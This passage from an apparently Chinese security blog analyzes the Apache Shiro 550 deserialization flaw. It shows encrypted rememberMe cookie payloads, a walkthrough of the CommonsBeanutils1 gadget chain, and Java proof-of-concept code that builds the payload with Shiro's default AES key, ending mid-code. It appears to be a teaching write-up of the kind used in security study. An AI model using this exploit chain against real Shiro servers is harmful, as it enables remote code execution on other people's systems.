mI2WM1mhn6SiO1QNWX79hSHZjAZTytzSpRXewdcPCmztKIyFZEYLPQlzZ5opck7Vb+3sxqRYjWucGEnVn8zKdUG/6XG3n1PXReOaXu8ZcK+XcdK57tAwiW2i/4ewrWv6wK3vIZ1S7SecN8Ff7Kg/mNVnAKFNVU/4YgI0hi1tgoou2k89ieMdayFpxQPrsTQHf8TTSsVKzGnU125XYarMHAosNLm9H6dkt09i5Qg72HT/wKq7vkZGOLQ4U9egq3FRsxDL9sq1BayxIqPAVcfjfQ7Ft+e4nYJ0GKANDc8Hv/4ij9qIjJ2rD6f0GUuU0rBS8xFVLenvKPUjneFgDcCtJ2ZmdZJGbH8Wget9lkEYp4ioMR7GSYIJ21bNAX/3imJ21yF2Qt74Gamc1972lYhOEtVWQeYwsW5AsDYIr9hVNysJvlXS6Wq2ear/vv0wALrp8De4IIuAhTxVUj4B2a8i7TcY1wl2UmPMfjnzEpKIQZAeJ96ESqYQSCNhH11NNdL6+Zg9kGqy2Q/bW/1nlTjg+dVs7bd8hq7ZEWo9qFNpCUg9ulN27sZA+nP6tlQYLioDJQtv0uos7EHkLrY63BAwE3yabrxn3RkLnk8arqkedmOag46+vydoiyqzDvka5HuZN7ntLTcggMo4lfG0MhTQji21qbky7zEZxeWty55t/UhCCLVQQsBQcu4v3M6eNe9maR985c1Nw7opVGKb9p1MAm7OCOq4Hkl4rwyWjroSXEaJpjQCdAiikTrMsIj2YDr5kIN79WEITTbBB6iMEimvXpqcy1nqqnNN3D4yKlf2zmwKpyvDYCoz71RCO+1P9O8Js3RftXHrHew2X/Y/2sGrn8YuxthTUBLhA7aF6+jMzVzBhmRygBcrx5E3zkOPIyDwP9jheD9ghHEBvCJE5Se3kXmcY0dsOVZWp1yCSQShAZL0dfCCCcLzG1V/ydV1Y3q8Jt5Q2KslxZkyF5gR94O3/46aqAXSCxyoxT3Sh/SFZ+wEOcI/XOqGrg9J82FnTBCvVOOvtV3mF0KC/p3TD8ARmpy1xE+1kt9C+CjYL+QAS/G/AppCDhNKAhH6K4gOnSv7XkvbGmw0L5lXj0jxLItOL13xZ6zU0dcDR8LwybZnZadALqTLpFHaBdDEms2QtRn8sIiXvvWqPZvKdbgw3MRcVtA==<br></code></pre></td></tr></table></figure><p>发送 cookie 请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">Cookie: <br>rememberMe=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<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101147642.png" alt="null"></p><p>也可以利用工具：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101147425.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101147524.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101151464.png" alt="null"></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p><strong>重写readObject</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Serializable 接口表示这个类支持 Java 序列化</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;qaz&quot;</span>;<br>    <span class="hljs-keyword">public</span> String gender=<span class="hljs-string">&quot;man&quot;</span>; <br><br>    <span class="hljs-comment">//构造方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserDemo</span><span class="hljs-params">(String name,String gender)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.gender=gender;<br>        System.out.println(name);<br>        System.out.println(gender);<br>    &#125;<br><br>    <span class="hljs-comment">//重写 readObject ，当使用 ObjectInputStream.readObject() 反序列化时，JVM 会自动检查类里是否有 private void readObject(ObjectInputStream) 方法，如果有，就会在恢复对象后调用它</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//表示按照默认方式反序列化对象的字段</span><br>        ois.defaultReadObject();<br>        <span class="hljs-comment">//反序列化时直接执行系统命令</span><br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Shiro使用的是Java原生反序列化（当一个类实现了Serializable接口并且重写readObject方法时，该方法会在对象进行反序列化时被调用），其漏洞成因是反序列化的类<strong>重写了readObject方法</strong>，反序列化时调用readObject() 触发重写类的readObject() 方法</p><p>利用：恶意命令 -&gt; 序列化 -&gt; AES加密 -&gt;  Base64编码 -&gt; rememberMe Cookie 值 -&gt; Base64解码 -&gt; AES解密 -&gt; 反序列化 -&gt; 执行恶意命令</p><h2 id="Shiro-550反序列化"><a href="#Shiro-550反序列化" class="headerlink" title="Shiro 550反序列化"></a>Shiro 550反序列化</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="参考文章：-1"><a href="#参考文章：-1" class="headerlink" title="参考文章："></a>参考文章：</h4><p>关于我学渗透的那档子事之Java反序列化-CB链</p><p><a href="https://www.freebuf.com/articles/web/319397.html">https://www.freebuf.com/articles/web/319397.html</a></p><p>Java代码审计&amp;Shiro反序列化&amp;CB1链</p><p><a href="https://blog.csdn.net/qq_46081990/article/details/135724944">https://blog.csdn.net/qq_46081990/article/details/135724944</a></p><p>CC链 1-7 分析</p><p><a href="https://xz.aliyun.com/news/8908">https://xz.aliyun.com/news/8908</a></p><p>Javaweb安全——反序列化漏洞-CC&amp;CB链思路整理</p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/127580121">https://blog.csdn.net/weixin_43610673/article/details/127580121</a></p><h4 id="1、CC-CB-链-（简单理解）"><a href="#1、CC-CB-链-（简单理解）" class="headerlink" title="1、CC &amp; CB 链 （简单理解）"></a>1、CC &amp; CB 链 （简单理解）</h4><p><strong>shiro反序列化利用工具</strong></p><p>JavaThings - Java安全漫谈笔记相关</p><p><a href="https://github.com/phith0n/JavaThings/tree/master">https://github.com/phith0n/JavaThings/tree/master</a></p><p><strong>Commons Collections 链</strong></p><p>来源 Apache Commons Collections 库，利用该库的 <code>Transformer</code>、<code>LazyMap</code> 等类，在反序列化时自动调用恶意代码</p><p><strong>Commons Beanutils 链</strong></p><p>来源：Apache Commons Beanutils 库，利用 <code>BeanComparator</code> 在反序列化触发排序比较时，调用 getter 方法，从而间接触发另一条漏洞链（常常是 cc 链）</p><p>CB 链生成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-comment">//获取 Evil 类，执行 Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.get(com.govuln.shiroattack.Evil.class.getName());<br>        <span class="hljs-comment">//调用 CommonsBeanutils1Shiro#getPayload，传入序列化的恶意类，生成 CB1 链反序列化的 payload</span><br>        <span class="hljs-type">byte</span>[] payloads = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommonsBeanutils1Shiro</span>().getPayload(clazz.toBytecode());<br><br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-comment">//将 key 值Base64 编码</span><br>        <span class="hljs-type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br><br>        <span class="hljs-comment">//使用 AES 加密 payload，</span><br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">ciphertext</span> <span class="hljs-operator">=</span> aes.encrypt(payloads, key);<br>        System.out.printf(ciphertext.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2、一个完整的攻击链通常由以下三个部分组成："><a href="#2、一个完整的攻击链通常由以下三个部分组成：" class="headerlink" title="2、一个完整的攻击链通常由以下三个部分组成："></a>2、一个完整的攻击链通常由以下三个部分组成：</h4><p>1、Source（源）：入口点，通常是指攻击链的起始点，其中用户输入或外部数据进入应用程序。在反序列化漏洞中，readObject 方法通常被认为是源，因为它是从输入流读取数据并进行反序列化的方法。</p><p>2、Sink（执行点）：执行点，是攻击链上的终点，其中攻击者希望执行恶意操作的位置。在反序列化漏洞中，sink 可能是一个动态方法执行、JNDI注入或写文件等操作。</p><p>3、Gadget（链）：连接入口执行的多个类，通过它们的相互方法调用形成攻击链。Gadget 类通常满足一些条件，例如类之间方法调用</p><p>是链式的，类实例之间的关系是嵌套的，调用链上的类都需要是可以序列化的。在反序列化漏洞中，Gadget 类是攻击者构建的、可序列</p><p>化的类，通过构建特定的对象图，使得在反序列化时执行恶意代码。</p><h4 id="3、理解数据结构"><a href="#3、理解数据结构" class="headerlink" title="3、理解数据结构"></a>3、理解数据结构</h4><p>数据结构：</p><p><a href="https://oi-wiki.org/ds/">https://oi-wiki.org/ds/</a></p><p>二叉堆</p><p><a href="https://oi-wiki.org/ds/binary-heap/">https://oi-wiki.org/ds/binary-heap/</a></p><p>堆分为大根堆（父节点值不小于子节点值）和小根堆（父节点值不大于子节点值）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110935553.png" alt="null"></p><h4 id="4、CB中的JavaBean利用"><a href="#4、CB中的JavaBean利用" class="headerlink" title="4、CB中的JavaBean利用"></a>4、CB中的JavaBean利用</h4><p>PropertyUtils.getProperty(new Person(),”name”);</p><p>自动调用Person对象里面的getName方法</p><p>PropertyUtils.getProperty(new TemplatesImpl(),”outputProperties”)</p><p>自动调用TemplatesImpl对象里面的getOutputProperties方法</p><h3 id="Shiro-550-CB1-链分析"><a href="#Shiro-550-CB1-链分析" class="headerlink" title="Shiro 550 CB1 链分析"></a>Shiro 550 CB1 链分析</h3><h4 id="利用链流程："><a href="#利用链流程：" class="headerlink" title="利用链流程："></a>利用链流程：</h4><p>**入口点：**PriorityQueue#readObject方法（java&#x2F;util&#x2F;PriorityQueue.java），PriorityQueue类中重写了readObject方法，Shiro反序列化时会调用这个类调用重写的readObject方法</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110916682.png" alt="null"></p><p>步入 heapify() </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110920916.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">// PriorityQueue 想象成一个二叉堆，本质是用一个数组 queue[] 存储的特殊二叉树<br>// heapify 的作用就是把一个“乱序”的数组，重新整理成符合堆规则的小根堆（即父节点值 &lt;= 子节点值）<br>private void heapify() &#123;<br>    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)<br>        siftDown(i, (E) queue[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 siftDown</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110921238.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">// siftDown() 方法其实是 堆化(heapify) 的核心步骤之一，用于把某个元素往下移动，使其符合小根堆规则<br>private void siftDown(int k, E x) &#123;<br>    if (comparator != null)<br>        siftDownUsingComparator(k, x);<br>    else<br>        siftDownComparable(k, x);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 siftDownUsingComparator ，堆化操作（heapify）的具体实现，用 <code>Comparator</code> 来比较元素大小。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110922654.png" alt="null"></p><p>跟进 comparator#compare，<code>Comparator&lt;T&gt;</code> 是一个<strong>函数式接口</strong>，用来定义“两个对象谁大谁小”。</p><p>它不要求对象本身实现 <code>Comparable</code>，可以把比较规则外置。</p><p><strong>返回值规则</strong>：</p><ul><li><p><code>&lt; 0</code> → <code>o1</code> 比 <code>o2</code> 小</p></li><li><p><code>0</code> → 相等</p></li><li><p><code>&gt; 0</code> → <code>o1</code> 比 <code>o2</code> 大</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110958560.png" alt="null"></p><p>那么接下来就要找到哪里调用了这个接口：</p><p><strong>关键点：BeanComparator.compare</strong></p><p>BeanComparator继承了Comparator类和Serializable类，并且出现了PropertyUtils.getProperty()</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111009650.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111012610.png" alt="null"></p><p>那么，当执行 <code>Object value1 = PropertyUtils.getProperty(o1, this.property);</code>时，对其传参：</p><ul><li><p><code>o1 = new TemplatesImpl()</code></p></li><li><p><code>property = outputProperties</code></p></li><li><p>就会自动调用 <code>TemplatesImpl#getOutputProperties</code> 方法</p></li></ul><p><strong>关键点：getOutputProperties</strong></p><p>找到 getOutputProperties：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111020514.png" alt="null"></p><p>执行：<code>newTransformer().getOutputProperties();</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111022417.png" alt="null"></p><p>跟进 newTransformer</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111023103.png" alt="null"></p><p>跟进getTransletInstance</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111318767.png" alt="null"></p><p>跟进 defineTransletClasses，当满足 <code>_bytecodes !== null</code>，向下执行 <code>loader.defineClass(_bytecodes[i])</code> ，将_bytecodes[i]中的字节码转换为Class对象，并将该类加载执行。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111321868.png" alt="null"></p><h4 id="总结调用链："><a href="#总结调用链：" class="headerlink" title="总结调用链："></a>总结调用链：</h4><p>PriorityQueue#readObject（入口点 Source） -&gt; heapify() -&gt; siftDown() -&gt; siftDownUsingComparator() -&gt; comparator.compare() </p><p>-&gt; BeanComparator.compare()</p><p>-&gt; PropertyUtils.getProperty() </p><p>-&gt;  TemplatesImpl#getOutputProperties()（执行点 Sink） -&gt; newTransformer() -&gt; getTransletInstance() -&gt; defineTransletClasses() </p><p>-&gt; loader.defineClass()</p><p>参照图片：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101449749.jpeg" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111343165.png" alt="null"></p><h4 id="总结条件："><a href="#总结条件：" class="headerlink" title="总结条件："></a>总结条件：</h4><ol><li><p>size值大于等于2；<code>size &gt;&gt;&gt; 1</code></p></li><li><p><code>comparator != null</code></p></li><li><p><code>this.property != null</code></p></li><li><p><code>o1 = new TemplatesImpl()</code>&amp;<code>this.property = outputProperties</code></p></li><li><p><code>_name != null</code>&amp;<code>_class == null</code></p></li><li><p><code>_bytecodes != null</code></p></li></ol><h4 id="POC编写分析-："><a href="#POC编写分析-：" class="headerlink" title="POC编写分析 ："></a>POC编写分析 ：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.govuln.shiroattack;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1Shiro</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//getClass 获取对象的类，getDeclaredField 通过反射获取这个类的声明字段（包括 private）</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        <span class="hljs-comment">//setAccessible(true) 关闭Java语言访问检查，允许程序访问和修改私有字段，允许我们突破私有权限限制，操作私有字段</span><br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//把传入的 value 赋给 obj 对象的这个字段</span><br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getPayload(<span class="hljs-type">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// TemplatesImpl 类 常用于加载 XSLT 模板,核心是它 _bytecodes 字段，存放字节码</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">// 使用setFieldValue方法修改其相关成员变量的值</span><br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazzBytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        <span class="hljs-comment">// TransformerFactoryImpl</span><br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//创建一个 BeanComparator，初始的 property 字段为 null</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-comment">//创建一个 PriorityQueue，使用刚创建的 BeanComparator 作为元素比较器</span><br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);<br>        <span class="hljs-comment">// stub data for replacement later</span><br>        <span class="hljs-comment">//先往 PriorityQueue 添加两个占位元素 &quot;1&quot;</span><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-comment">//通过反射设置 comparator 的 property 字段为 &quot;outputProperties&quot;,BeanComparator 会在比较时通过反射调用对象的 getOutputProperties() 方法</span><br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span 